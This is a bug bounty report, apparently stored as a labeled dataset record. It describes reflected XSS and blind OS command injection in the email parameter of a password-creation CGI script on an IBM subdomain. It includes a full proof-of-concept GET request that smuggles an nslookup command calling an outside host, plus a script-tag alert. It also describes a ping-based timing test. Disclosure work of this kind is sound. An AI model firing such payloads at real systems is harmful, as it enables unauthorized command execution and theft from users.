title: Reflected XSS and Blind out of band command injection at subdomain dstuid-ww.dst.ibm.com
content:
I found an XSS and Blind OS based injection issue due to the incorrect handling of the characters in THE EMAIL get& post parameters. A <script> injected and a sleep command succesfully executed, the following link works as a PoC that alerts the string in the script:
I reproduced the same on Firefox and IE and Microsoft Edge
XSS POC URL:-
GET /cgi-bin/PasswordCreate.pl?email=%26nslookup%20%22dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh%22%2286m.r87.me%22cier4%3cscript%3ealert(1)%3c%2fscript%3emikflzhwaep&ibm-submit=Submit HTTP/1.1

For the blind os command injection i used three variables:_
A random email address (To bench mark the normal responce time
Ping requests of 10 and 20 seconds
The reply from the server prooved that the time-delay inference existed.
See attached videos and images for POC
Impact
This allows an attacker to inject custom Javascript codes that can be used to steal information from user base and lure them to malicious websites on the internet on behalf of IBM website.
steps: Observe the execution of the injected script (alert popup) or the delay in response for the OS command injection
vuln_description: The vulnerability is a combination of Reflected XSS and Blind OS Command Injection in the email parameter of the PasswordCreate.pl script on dstuid-ww.dst.ibm.com. The improper handling of user input allows attackers to inject malicious scripts (XSS) and execute arbitrary OS commands (Command Injection).
reason: The vulnerability involves straightforward injection techniques without requiring complex application state manipulation or understanding of novel logic. The attack components are common and well-documented in security literature.

authnz_metadata.reason: The vulnerability involves XSS and blind OS command injection, which are not related to authentication or authorization bypass. The methodology described focuses on AuthN/AuthZ and IDOR vulnerabilities, which are different from the reported issues.
